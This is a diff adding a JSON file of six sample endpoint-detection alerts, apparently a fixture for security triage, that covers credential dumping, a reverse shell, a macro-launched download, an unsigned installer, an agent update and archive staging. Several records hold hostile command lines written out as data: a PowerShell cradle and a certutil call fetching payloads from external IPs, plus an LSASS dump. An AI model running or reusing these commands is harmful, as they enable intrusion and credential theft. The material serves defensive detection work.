@@ -1,0 +1,98 @@
+[
+  {
+    "event_id": "edr-9001",
+    "detection_name": "Credential Dumping Tool Signature Match",
+    "timestamp": "2026-08-20T14:07:40Z",
+    "severity_score": 9,
+    "summary": "Process behavior consistent with LSASS memory access for credential extraction (Mimikatz-family signature).",
+    "endpoint": "WKS-EU-0231",
+    "username": "jsmith",
+    "process": "lsass_dump.exe",
+    "cmdline": "lsass_dump.exe --pid 812 --out C:\\Windows\\Temp\\creds.bin",
+    "sha256": "ef1b08f1882961ffb0dc95be40f2b29f1902758e10cae29ea91a016219247c02",
+    "network": {
+      "remote_ip": null,
+      "remote_port": null
+    }
+  },
+  {
+    "event_id": "edr-9002",
+    "detection_name": "Reverse Shell Network Behavior",
+    "timestamp": "2026-08-20T14:12:15Z",
+    "severity_score": 10,
+    "summary": "Outbound connection from an uncommon parent process to an external IP with shell-like bidirectional traffic pattern.",
+    "endpoint": "WKS-EU-0231",
+    "username": "jsmith",
+    "process": "powershell.exe",
+    "cmdline": "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/stage2.ps1')",
+    "sha256": "4c297b0b5335bbc2c80250874ffa625289fc068e001953ac3337951238cd8cba",
+    "network": {
+      "remote_ip": "185.220.101.47",
+      "remote_port": 4444
+    }
+  },
+  {
+    "event_id": "edr-9003",
+    "detection_name": "Unsigned Binary Executed From User Temp",
+    "timestamp": "2026-08-20T11:02:03Z",
+    "severity_score": 4,
+    "summary": "An unsigned executable was launched from a user's Downloads/Temp directory. Common for both legitimate installers and malware droppers.",
+    "endpoint": "WKS-EU-0450",
+    "username": "bpatel",
+    "process": "setup_tool_v2.exe",
+    "cmdline": "setup_tool_v2.exe /silent",
+    "sha256": "b1115f55f0c9deb2ac758653b576d0d61b5e02f595a0adea54c6193a9a9b1264",
+    "network": {
+      "remote_ip": null,
+      "remote_port": null
+    }
+  },
+  {
+    "event_id": "edr-9004",
+    "detection_name": "Office Macro Spawned Child Process",
+    "timestamp": "2026-08-20T10:55:41Z",
+    "severity_score": 7,
+    "summary": "winword.exe spawned cmd.exe, a pattern consistent with a malicious macro executing a payload.",
+    "endpoint": "WKS-EU-0512",
+    "username": "tngo",
+    "process": "cmd.exe",
+    "cmdline": "cmd.exe /c certutil -urlcache -split -f http://45.146.164.12/payload.exe payload.exe",
+    "sha256": "8112c4dcc55014ed951ab297df3c8d4ef0d2835b6230fccd4ecf93f9d51bee09",
+    "network": {
+      "remote_ip": "45.146.164.12",
+      "remote_port": 80
+    }
+  },
+  {
+    "event_id": "edr-9005",
+    "detection_name": "Endpoint Agent Self-Update",
+    "timestamp": "2026-08-20T07:30:00Z",
+    "severity_score": 1,
+    "summary": "Routine EDR agent binary update, signed and from the vendor's known-good update channel.",
+    "endpoint": "WKS-EU-0102",
+    "username": null,
+    "process": "edr_agent_updater.exe",
+    "cmdline": "edr_agent_updater.exe --check",
+    "sha256": "a19a7467ed333f8ec6cc65bc8e7bc54af1a027e8a54fe4f22d39830dd6966333",
+    "network": {
+      "remote_ip": "23.45.67.89",
+      "remote_port": 443
+    }
+  },
+  {
+    "event_id": "edr-9006",
+    "detection_name": "Archive Utility Compressing Large Directory",
+    "timestamp": "2026-08-20T14:18:02Z",
+    "severity_score": 6,
+    "summary": "7z.exe observed compressing a large portion of a user's document directory shortly before a large outbound transfer, consistent with staging for exfiltration.",
+    "endpoint": "WKS-EU-0231",
+    "username": "jsmith",
+    "process": "7z.exe",
+    "cmdline": "7z.exe a -p C:\\Windows\\Temp\\archive.7z C:\\Users\\jsmith\\Documents\\*",
+    "sha256": "8dd4f534079fd335290764501b877417fadf2cecd6b5add90d50a72ef70c50c5",
+    "network": {
+      "remote_ip": null,
+      "remote_port": null
+    }
+  }
+]
